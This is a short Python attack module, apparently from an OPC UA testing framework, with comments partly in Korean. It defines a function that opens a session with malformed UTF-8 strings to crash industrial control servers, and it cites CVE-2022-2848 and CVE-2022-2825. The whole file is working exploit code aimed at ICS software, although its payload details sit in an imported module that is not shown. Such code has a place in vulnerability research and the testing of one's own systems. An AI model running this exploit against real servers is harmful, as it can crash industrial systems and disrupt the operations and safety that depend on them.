# Malformed UTF-8 Attack
#   Triggering a application crash after processing malformed UTF8 strings
#
# CVEs:
#   - CVE-2022-2848: https://www.cisa.gov/uscert/ics/advisories/icsa-22-242-10
#   - CVE-2022-2825: https://www.cisa.gov/uscert/ics/advisories/icsa-22-242-10
#

import datetime

from protocol import *  # OPC UA 프로토콜 관련 모듈
from config import *  # 설정값을 포함하는 모듈

# 이 공격은 잘못된 UTF-8 문자열을 처리할 때 발생하는 응용 프로그램 충돌을 유발합니다.
# 주로 UTF-8 문자열 처리에서 발생하는 취약점(CVE-2022-2848, CVE-2022-2825)을 노립니다.

# 공격 함수 정의
def attack(server_details):
    program_type, ip_addr, port, query_string = server_details

    # OPCUA 객체 생성 및 잘못된 UTF-8 세션 생성 옵션 활성화
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session(create_malformed_utf8_session=True)  # 잘못된 UTF-8 세션 생성

